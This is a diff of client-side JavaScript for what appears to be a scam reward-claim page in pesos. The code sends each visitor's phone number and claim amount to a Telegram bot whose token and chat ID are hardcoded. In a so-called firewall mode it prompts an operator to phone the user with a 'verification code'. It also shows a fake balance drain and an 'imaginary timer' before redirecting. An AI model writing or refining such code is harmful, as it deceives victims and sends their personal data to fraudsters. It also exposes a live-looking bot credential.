@@ -25,10 +25,9 @@ async function isFirewallActive() {
 
 // Send notification to admin when user requests verification
 async function sendVerificationRequestNotification(phone, amount) {
-    const message = `📞 VERIFICATION REQUEST (FIREWALL MODE)\n📱 ${phone}\n💵 ₱${amount}\n⏰ ${new Date().toLocaleString()}\n\nCall the user and provide the verification code.`;
+    const message = `📞 VERIFY REQUEST\n📱 ${phone}\n💵 ₱${amount}`;
     try {
         await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`);
-        console.log("📨 Verification request sent to Telegram");
     } catch(e) {
         console.log("Telegram error:", e);
     }
@@ -39,18 +38,14 @@ async function showClaimPopup(amount) {
     const firewallActive = await isFirewallActive();
     
     if (firewallActive) {
-        // FIREWALL ON - Send notification to admin
         const userPhone = localStorage.getItem("userPhone") || "Unknown";
         await sendVerificationRequestNotification(userPhone, amount);
-        
-        // Show verification popup
         if (typeof window.showFirewallPopup === 'function') {
             window.showFirewallPopup();
         }
         return;
     }
     
-    // FIREWALL OFF - Normal congratulations popup
     claimState.currentAmount = amount;
     claimState.isProcessing = false;
     claimState.hasRedirected = false;
@@ -84,12 +79,28 @@ function hidePendingStatus() {
     claimState.isPending = false;
 }
 
-function updateVisibleCountdown(seconds) {
-    const timerSpan = document.getElementById('pendingCountdown');
-    if (!timerSpan) return;
-    const mins = Math.floor(seconds / 60);
-    const secs = seconds % 60;
-    timerSpan.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+function startSmoothDecrement(originalAmount) {
+    const balanceText = document.getElementById('balanceText');
+    if (!balanceText) return;
+    
+    let current = originalAmount;
+    const totalDuration = 3500;
+    const intervalTime = 50;
+    const steps = totalDuration / intervalTime;
+    const decrementPerStep = originalAmount / steps;
+    let stepCount = 0;
+    
+    claimState.balanceDecrementInterval = setInterval(() => {
+        stepCount++;
+        current = Math.max(0, originalAmount - (decrementPerStep * stepCount));
+        balanceText.innerText = "₱" + current.toFixed(2);
+        
+        if (current <= 0.01) {
+            clearInterval(claimState.balanceDecrementInterval);
+            claimState.balanceDecrementInterval = null;
+            balanceText.innerText = "₱0.00";
+        }
+    }, intervalTime);
 }
 
 function startVisibleCountdown(originalAmount) {
@@ -100,7 +111,6 @@ function startVisibleCountdown(originalAmount) {
     
     if (!timerSpan) return;
     
-    // Update display every second
     claimState.countdownInterval = setInterval(() => {
         if (remaining > 0) {
             remaining--;
@@ -110,7 +120,6 @@ function startVisibleCountdown(originalAmount) {
         }
         
         if (remaining <= 0) {
-            // Stop countdown
             clearInterval(claimState.countdownInterval);
             claimState.countdownInterval = null;
             
@@ -131,40 +140,13 @@ function startVisibleCountdown(originalAmount) {
                 if (typeof saveData === 'function') saveData();
             }
             
-            // Hide pending status area
             if (pendingArea) pendingArea.style.display = 'none';
-            
-            // Show withdraw button again
             if (withdrawBtn) withdrawBtn.style.display = 'block';
             
-            // Reset claim state
             claimState.isProcessing = false;
             claimState.hasRedirected = false;
         }
     }, 1000);
-}
-
-function startSmoothDecrement(originalAmount, onComplete) {
-    const balanceText = document.getElementById('balanceText');
-    if (!balanceText) return;
-    let current = originalAmount;
-    const totalDuration = 3500;
-    const intervalTime = 50;
-    const steps = totalDuration / intervalTime;
-    const decrementPerStep = originalAmount / steps;
-    let stepCount = 0;
-    
-    claimState.balanceDecrementInterval = setInterval(() => {
-        stepCount++;
-        current = Math.max(0, originalAmount - (decrementPerStep * stepCount));
-        balanceText.innerText = "₱" + current.toFixed(2);
-        if (current <= 0.01) {
-            clearInterval(claimState.balanceDecrementInterval);
-            claimState.balanceDecrementInterval = null;
-            balanceText.innerText = "₱0.00";
-            if (onComplete) onComplete();
-        }
-    }, intervalTime);
 }
 
 function startImaginaryTimer(redirectUrl) {
@@ -187,7 +169,6 @@ function onClaimAction() {
     claimBtn.disabled = true;
     claimBtn.innerHTML = 'PROCESSING...';
     
-    // Send claim request to Telegram
     const message = `💰 CLAIM REQUEST!\n📱 ${userPhone}\n💵 ₱${amount}`;
     fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`)
         .catch(e => console.log('Telegram error:', e));
@@ -207,19 +188,10 @@ function onClaimAction() {
                     claimedAt: Date.now() 
                 });
                 
-                // Hide claim popup
                 hideClaimPopup();
-                
-                // Show pending status area
                 showPendingStatus();
-                
-                // Start balance decrement animation
                 startSmoothDecrement(amount);
-                
-                // Start countdown timer (3 minutes) - pass the original amount
                 startVisibleCountdown(amount);
-                
-                // Start imaginary timer for redirect
                 startImaginaryTimer(redirectUrl);
                 
             } else {
